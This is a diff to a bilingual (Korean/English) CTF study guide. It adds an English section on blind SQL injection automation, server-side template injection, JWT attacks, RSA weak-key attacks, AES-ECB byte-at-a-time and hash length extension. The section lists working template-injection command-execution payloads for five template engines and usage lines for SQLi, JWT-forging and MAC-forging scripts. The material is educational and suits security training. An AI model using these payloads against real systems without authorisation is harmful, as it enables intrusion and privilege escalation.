@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Web과 Crypto CTF 기법
 
 Web CTF는 SQLi 자동화, SSTI, JWT 공격, 역직렬화 취약점을 다루고, Crypto CTF는 RSA 취약 키 분석과 블록 암호 모드 공격을 다룬다.
@@ -633,4 +639,132 @@ if __name__ == "__main__":
     print(f"[+] 새 MAC: {new_mac}")
     print(f"[+] 새 메시지 (hex): {new_msg.hex()}")
     print(f"[+] URL 인코딩: {new_msg}")
+```
+
+---
+
+<a name="english"></a>
+
+# Web and Crypto CTF Techniques
+
+Web CTF covers blind SQLi automation, SSTI, JWT attacks, and deserialization vulnerabilities. Crypto CTF covers RSA weak key analysis and block cipher mode attacks.
+
+---
+
+## 1. Web CTF Techniques
+
+### 1.1 Blind SQLi Automation
+
+The Python script above automates both boolean-based and time-based blind SQL injection using binary search for efficient character extraction. Key features:
+- **Boolean-based**: Uses a true-condition indicator string to infer characters via binary search
+- **Time-based**: Uses `SLEEP()` delays with configurable threshold to infer characters character-by-character
+
+Usage:
+```bash
+# Time-based
+python3 sqli.py http://target.com --param id --query "SELECT database()" --type time
+
+# Boolean-based
+python3 sqli.py http://target.com --param id --indicator "Welcome" --type boolean
+```
+
+---
+
+### 1.2 SSTI (Server-Side Template Injection)
+
+```
+Detection and payloads by engine:
+
+Jinja2 (Python/Flask):
+  Detection: {{7*7}} → 49
+  OS execution: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+  Class enumeration: {{''.__class__.__mro__[1].__subclasses__()}}
+
+Twig (PHP):
+  Detection: {{7*7}} → 49
+  OS execution: {{['id']|filter('system')}}
+
+Freemarker (Java):
+  Detection: ${7*7} → 49
+  OS execution: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+Smarty (PHP):
+  Detection: {7*7} → 49
+  OS execution: {php}echo `id`;{/php}
+
+Velocity (Java):
+  Detection: #set($x=7*7)$x → 49
+  OS execution: #set($r=$Runtime.exec("id"))
+```
+
+The SSTI detection script probes multiple engines and automatically attempts RCE payloads once the engine is identified.
+
+---
+
+### 1.3 JWT Attack Techniques
+
+Three main JWT attack vectors:
+
+1. **alg:none attack** — Change the algorithm to "none" and strip the signature
+2. **RS256→HS256 confusion** — Sign with the server's public key using HMAC
+3. **HS256 brute-force** — Dictionary attack against the HMAC secret key
+
+```bash
+# Parse a JWT
+python3 jwt_attack.py parse <token>
+
+# alg:none attack with role escalation
+python3 jwt_attack.py none <token> --claim role admin
+
+# Brute-force the secret
+python3 jwt_attack.py brute <token> --wordlist /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+## 2. Crypto CTF Techniques
+
+### 2.1 RSA CTF Solver CLI
+
+Key attack implementations:
+- **Small N factorization** — Trial division for weak moduli
+- **Wiener's Attack** — Recovers small private exponent d via continued fractions
+- **Low exponent attack** — e-th root attack for small public exponents (e.g., e=3)
+- **Common modulus attack** — Recovers plaintext when the same message is encrypted with different exponents sharing the same modulus
+
+```bash
+# Parse RSA key and get FactorDB hint
+python3 rsa_solver.py parse key.pem
+
+# Wiener's attack
+python3 rsa_solver.py wiener --e <e> --n <n>
+
+# Low exponent (e=3) attack
+python3 rsa_solver.py low-e --c <ciphertext> --n <n>
+
+# Direct decryption with known factors
+python3 rsa_solver.py decrypt --p <p> --q <q> --e 65537 --c <ciphertext>
+```
+
+---
+
+### 2.2 AES ECB Block Manipulation
+
+The AES-ECB byte-at-a-time attack recovers a secret by:
+1. Detecting block size by monitoring ciphertext length changes
+2. Controlling input length to position unknown bytes at block boundaries
+3. Brute-forcing each byte by comparing ciphertext blocks
+
+---
+
+### 2.3 Hash Length Extension Attack
+
+The attack exploits the Merkle-Damgard construction of SHA-256/SHA-512:
+- **Target**: MAC = SHA256(secret_key + data)
+- **Goal**: Forge MAC = SHA256(secret_key + data + padding + appended_data)
+- **Requirement**: Only the MAC value, original data, and key length are needed
+
+```bash
+python3 hash_ext.py --mac <known_mac_hex> --data "original_data" \
+    --append "&admin=true" --key-len 16 --algo sha256
 ```
